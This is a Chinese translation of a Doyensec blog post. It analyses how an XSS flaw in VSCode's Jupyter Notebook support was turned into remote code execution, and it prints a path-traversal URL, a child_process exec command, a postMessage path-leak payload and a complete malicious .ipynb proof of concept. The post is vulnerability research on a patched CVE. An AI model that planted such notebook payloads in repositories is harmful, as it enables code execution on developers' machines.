# Visual Studio Code Jupyter Notebook RCE · Doyensec's Blog
2022 年 10 月 27 日 - Luca Carettoni 发布

在过去的周末，我抽出了几个小时来研究[Justin Steven](https://twitter.com/justinsteven)在 2021 年 8 月发现的这个[Visual Studio Code .ipynb Jupyter Notebook 漏洞](https://github.com/justinsteven/advisories/blob/master/2021_vscode_ipynb_xss_arbitrary_file_read.md)的利用情况。[](https://twitter.com/justinsteven)

Justin 发现了一个跨站点脚本 (XSS) 漏洞，该漏洞影响 VSCode 对 Jupyter Notebook ( ) 文件的内置支持`.ipynb`。

```
{  "cells":  [  {  "cell_type":  "code",  "execution_count":  null,  "source":  [],  "outputs":  [  {  "output_type":  "display_data",  "data":  {"text/markdown":  "<img src=x onerror='console.log(1)'>"}  }  ]  }  ]  } 
```

他的分析详细说明了这个问题，并展示了从磁盘读取任意文件然后将其内容泄漏到远程服务器的概念证明，但这并不是一个完整的 RCE 漏洞利用。

> 我找不到一种方法来利用这个 XSS 原语来实现任意代码执行，但是更熟练地利用 Electron 的人也许能够做到这一点。\[…\]

鉴于我们专注于 ElectronJs（以及许多其他网络技术），我决定研究潜在的开发场所。

作为第一步，我查看了应用程序的整体设计，以确定`BrowserWindow/BrowserView/Webview`VScode 使用的每个应用程序的配置。[在ElectroNG](https://get-electrong.com/)的协助下，可以观察到应用程序使用单个`BrowserWindow`with `nodeIntegration:on`。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/74f5338d-8e93-419e-b44c-4bc4bdff4ee4.png?raw=true)

这`BrowserWindow`使用`vscode-file`协议加载内容，类似于`file`协议。不幸的是，我们的注入发生在嵌套的沙盒 iframe 中，如下图所示：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/9daee064-7671-4173-9466-1f4ca255b20b.png?raw=true)

特别是，我们的`sandbox`iframe 是使用以下属性创建的：

```
allow-scripts allow-same-origin allow-forms allow-pointer-lock allow-downloads 
```

默认情况下，`sandbox`使浏览器将 iframe 视为来自另一个来源，即使它`src`指向同一站点。多亏了这个`allow-same-origin`属性，这个限制被取消了。只要 webview 中加载的内容也托管在本地文件系统（在 app 文件夹中），我们就可以访问该`top`窗口。有了它，我们可以简单地使用类似`top.require('child_process').exec('open /System/Applications/Calculator.app');`

那么，**我们如何将任意 HTML/JS 内容放置在应用程序安装文件夹中？**

或者，**我们可以引用该文件夹外的资源吗？**

答案来自我在最新的 Black Hat USA 2022 简报会上观看的[最近一次演示](https://i.blackhat.com/USA-22/Thursday/US-22-Purani-ElectroVolt-Pwning-Popular-Desktop-Apps.pdf)。在利用[CVE-2021-43908](https://blog.electrovolt.io/posts/vscode-rce/)时，[TheGrandPew](https://twitter.com/TheGrandPew)和[s1r1us](https://twitter.com/S1r1u5_)使用路径遍历加载 VSCode 安装路径之外的任意文件。

`vscode-file://vscode-app/Applications/Visual Studio Code.app/Contents/Resources/app/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F/somefile.html`

与他们的利用类似，我们可以尝试利用 a`postMessage`的回复来泄露当前用户目录的路径。事实上，我们的 payload 可以与触发 XSS 的 Jupyter Notebook 文件一起放置在恶意存储库中。

经过几个小时的反复试验，我发现我们可以`img`通过在事件期间强制执行来获取触发 XSS 的标签的引用`onload`。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/d5f177a5-e5a7-4044-be0b-fc40b6069a17.png?raw=true)

这样，所有的成分都准备好了，我终于可以组装最终的 exploit 了。

```
var apploc = '/Applications/Visual Studio Code.app/Contents/Resources/app/'.replace(/ /g, '%20');
var repoloc;
window.top.frames[0].onmessage = event => {
    if(event.data.args.contents && event.data.args.contents.includes('<base href')){  
        var leakloc = event.data.args.contents.match('<base href=\"(.*)\"')[1];
        var repoloc = leakloc.replace('https://file%2B.vscode-resource.vscode-webview.net','vscode-file://vscode-app'+apploc+'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..');
        setTimeout(async()=>console.log(repoloc+'poc.html'), 3000)
        location.href=repoloc+'poc.html';
    }
};
window.top.postMessage({target: window.location.href.split('/')[2],channel: 'do-reload'}, '*'); 
```

要在文件中传递此有效负载，`.ipynb`我们还需要克服最后一个限制：当前的实现会导致格式错误的 JSON。注入发生在一个 JSON 文件（双引号）中，我们的 Javascript 有效负载包含带引号的字符串以及用作提取路径的正则表达式的定界符的双引号。

经过一些修改后，最简单的解决方案涉及反引号 ` 字符而不是所有 JS 字符串的引号。

最终`pocimg.ipynb`文件如下所示：

```
{  "cells":  [  {  "cell_type":  "code",  "execution_count":  null,  "source":  [],  "outputs":  [  {  "output_type":  "display_data",  "data":  {"text/markdown":  "<img src='a445fff1d9fd4f3fb97b75202282c992.png' onload='var apploc = `/Applications/Visual Studio Code.app/Contents/Resources/app/`.replace(/ /g, `%20`);var repoloc;window.top.frames[0].onmessage = event => {if(event.data.args.contents && event.data.args.contents.includes(`<base href`)){var leakloc = event.data.args.contents.match(`<base href=\"(.*)\"`)[1];var repoloc = leakloc.replace(`https://file%2B.vscode-resource.vscode-webview.net`,`vscode-file://vscode-app`+apploc+`..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..`);setTimeout(async()=>console.log(repoloc+`poc.html`), 3000);location.href=repoloc+`poc.html`;}};window.top.postMessage({target: window.location.href.split(`/`)[2],channel: `do-reload`}, `*`);'>"}  }  ]  }  ]  } 
```

通过使用此文件打开恶意存储库，我们最终可以触发我们的代码执行。

  
内置的 Jupyter Notebook 扩展选择退出Visual Studio Code 1.57 中引入的_Workspace Trust_功能提供的保护，因此不需要进一步的用户交互。郑重声明，此问题已在 VScode 1.59.1 中得到修复，Microsoft为其分配了[CVE-2021-26437 。](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26437)